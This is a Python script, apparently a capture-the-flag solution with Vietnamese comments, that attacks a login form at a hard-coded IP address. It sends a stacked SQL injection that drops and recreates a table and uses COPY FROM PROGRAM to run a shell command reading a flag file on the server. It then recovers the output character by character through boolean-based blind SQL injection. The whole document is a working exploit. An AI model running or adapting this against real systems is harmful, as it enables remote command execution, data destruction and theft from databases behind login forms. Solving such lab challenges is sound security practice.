import requests

charset = 'abcdefghijklmnopqrstuvwxyz.0123456789_ABCDEFGHIJKLMNOPQRSTUVWXYZ!@#$%^&*()}{ ,'
flag = ''

burp_url = "http://103.97.125.56:31504/"

headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
}

burp_data = {
        "username": f"admin'; DROP TABLE IF EXISTS abc; CREATE TABLE abc(aaa text); COPY abc FROM PROGRAM 'cat /flagXXXXX.txt';--",
        "password": "2" # XXXX: chỗ cần sửa
}
response = requests.post(burp_url, data=burp_data, headers=headers)

for index in range(1, 100):
    found = False
    for c in charset:
        burp_data = {
            "username": f"admin' OR (SELECT SUBSTRING(aaa,{index},1) FROM abc LIMIT 1) = '{c}';--",
            "password": "2"
        }
        print("dang test ki tu thu ",index," :",c,end="\r")

        response = requests.post(burp_url, data=burp_data, headers=headers)

        if "Welcome, " in response.text:
            flag += c
            found = True
            print("\nFLAG:", flag)
            break

    if not found:
        print("Not found")
        break

print("\n[✅] FLAG cuối cùng:", flag)
print("Finished!!!!!")
